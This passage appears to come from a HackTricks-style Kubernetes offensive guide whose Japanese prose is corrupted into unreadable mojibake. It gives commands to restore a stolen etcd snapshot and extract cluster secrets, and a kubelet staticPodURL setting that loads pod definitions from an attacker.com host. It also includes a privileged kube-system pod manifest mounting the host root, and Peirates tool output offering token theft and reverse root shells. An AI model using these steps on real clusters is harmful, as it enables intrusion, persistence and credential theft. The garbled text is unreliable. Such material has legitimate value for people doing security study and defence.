3. ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å±•é–‹ã—ã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
mkdir -p restore ; etcdutl snapshot restore etcd-loot-backup.db \ --data-dir ./restore
```
{% endcode %}

4. ã‚ãªãŸã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ã§**`etcd`**ã‚’èµ·å‹•ã—ã€ç›—ã¾ã‚ŒãŸã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã‚ˆã†ã«ã—ã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
etcd \ --data-dir=./restore \ --initial-cluster=state=existing \ --snapshot='./etcd-loot-backup.db'

```
{% endcode %}

5. ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹:
```bash
etcdctl get "" --prefix --keys-only | grep secret
```
6. ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹:
```bash
etcdctl get /registry/secrets/default/my-secret
```
### Static/Mirrored Pods Persistence

_Static Pods_ ã¯ã€API ã‚µãƒ¼ãƒãƒ¼ãŒãã‚Œã‚‰ã‚’ç›£è¦–ã™ã‚‹ã“ã¨ãªãã€ç‰¹å®šã®ãƒãƒ¼ãƒ‰ä¸Šã® kubelet ãƒ‡ãƒ¼ãƒ¢ãƒ³ã«ã‚ˆã£ã¦ç›´æ¥ç®¡ç†ã•ã‚Œã¾ã™ã€‚ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã‚‹ Podsï¼ˆä¾‹ãˆã°ã€Deploymentï¼‰ã¨ã¯ç•°ãªã‚Šã€**kubelet ã¯å„é™çš„ Pod ã‚’ç›£è¦–ã—**ï¼ˆå¤±æ•—ã—ãŸå ´åˆã¯å†èµ·å‹•ã—ã¾ã™ï¼‰ã€‚

ã—ãŸãŒã£ã¦ã€é™çš„ Pods ã¯å¸¸ã« **ç‰¹å®šã®ãƒãƒ¼ãƒ‰ä¸Šã® 1 ã¤ã® Kubelet ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã¦ã„ã¾ã™**ã€‚

**kubelet ã¯ã€å„é™çš„ Pod ã«å¯¾ã—ã¦ Kubernetes API ã‚µãƒ¼ãƒãƒ¼ã«ãƒŸãƒ©ãƒ¼ãƒãƒƒãƒ‰ã‚’è‡ªå‹•çš„ã«ä½œæˆã—ã‚ˆã†ã¨ã—ã¾ã™**ã€‚ã“ã‚Œã¯ã€ãƒãƒ¼ãƒ‰ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ Pods ãŒ API ã‚µãƒ¼ãƒãƒ¼ã§å¯è¦–åŒ–ã•ã‚Œã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ãŒã€ãã“ã‹ã‚‰åˆ¶å¾¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚Pod åã¯ã€å…ˆé ­ã«ãƒã‚¤ãƒ•ãƒ³ã‚’ä»˜ã‘ã¦ãƒãƒ¼ãƒ‰ã®ãƒ›ã‚¹ãƒˆåãŒæ¥å°¾è¾ã¨ã—ã¦ä»˜åŠ ã•ã‚Œã¾ã™ã€‚

{% hint style="danger" %}
é™çš„ Pod ã® **`spec` ã¯ä»–ã® API ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å‚ç…§ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ï¼ˆä¾‹ï¼šServiceAccountã€ConfigMapã€Secret ãªã©ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€**ã“ã®å‹•ä½œã‚’æ‚ªç”¨ã—ã¦ã€ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã§ä»»æ„ã® serviceAccount ã‚’æŒã¤ãƒãƒƒãƒ‰ã‚’èµ·å‹•ã—ã¦ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€ä½•ã‚‰ã‹ã®ç†ç”±ã§å½¹ç«‹ã¤å ´åˆã«ã€ç•°ãªã‚‹åå‰ç©ºé–“ã§ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã“ã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã™ã€‚
{% endhint %}

ãƒãƒ¼ãƒ‰ãƒ›ã‚¹ãƒˆå†…ã«ã„ã‚‹å ´åˆã€**é™çš„ãƒãƒƒãƒ‰ã‚’å†…éƒ¨ã«ä½œæˆã•ã›ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€**kube-system** ã®ã‚ˆã†ãªç•°ãªã‚‹åå‰ç©ºé–“ã«ãƒãƒƒãƒ‰ã‚’ä½œæˆã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚

é™çš„ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒå¤§ã„ã«å½¹ç«‹ã¡ã¾ã™**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ã€‚åŸºæœ¬çš„ã«å¿…è¦ãªã‚‚ã®ã¯ 2 ã¤ã§ã™ï¼š

* **kubelet ã‚µãƒ¼ãƒ“ã‚¹**ã® **`--pod-manifest-path=/etc/kubernetes/manifests`** ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’è¨­å®šã™ã‚‹ã‹ã€**kubelet è¨­å®š**ã®ä¸­ã§è¨­å®šã—ï¼ˆ[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)ï¼‰ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•ã—ã¾ã™
* **`/etc/kubernetes/manifests`** ã«ã‚ã‚‹ **ãƒãƒƒãƒ‰å®šç¾©**ã®å®šç¾©ã‚’ä½œæˆã—ã¾ã™

**ã‚‚ã†ä¸€ã¤ã®ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹ãªæ–¹æ³•ã¯ï¼š**

* **kubelet** è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã® **`staticPodURL`** ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã—ã€`staticPodURL: http://attacker.com:8765/pod.yaml` ã®ã‚ˆã†ã«è¨­å®šã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€kubelet ãƒ—ãƒ­ã‚»ã‚¹ã¯**æŒ‡å®šã•ã‚ŒãŸ URL ã‹ã‚‰æ§‹æˆã‚’å–å¾—ã—ã¦é™çš„ãƒãƒƒãƒ‰ã‚’ä½œæˆã—ã¾ã™**ã€‚

**ç‰¹æ¨©ãƒãƒƒãƒ‰ã‚’ **kube-system** ã«ä½œæˆã™ã‚‹ãŸã‚ã®ãƒãƒƒãƒ‰æ§‹æˆã®ä¾‹ã¯ã€[**ã“ã¡ã‚‰**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ã‹ã‚‰å–å¾—ã—ã¾ã—ãŸï¼š**
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### ãƒãƒƒãƒ‰ã®å‰Šé™¤ + ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯èƒ½ãªãƒãƒ¼ãƒ‰

æ”»æ’ƒè€…ãŒ**ãƒãƒ¼ãƒ‰ã‚’ä¾µå®³**ã—ã€ä»–ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰**ãƒãƒƒãƒ‰ã‚’å‰Šé™¤**ã—ã€**ä»–ã®ãƒãƒ¼ãƒ‰ãŒãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã§ããªã„ã‚ˆã†ã«ã™ã‚‹**ã“ã¨ãŒã§ãã‚Œã°ã€ãƒãƒƒãƒ‰ã¯ä¾µå®³ã•ã‚ŒãŸãƒãƒ¼ãƒ‰ã§å†å®Ÿè¡Œã•ã‚Œã€å½¼ã¯ãã‚Œã‚‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã‚‹ã€‚\
[**è©³ç´°ã«ã¤ã„ã¦ã¯ã“ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
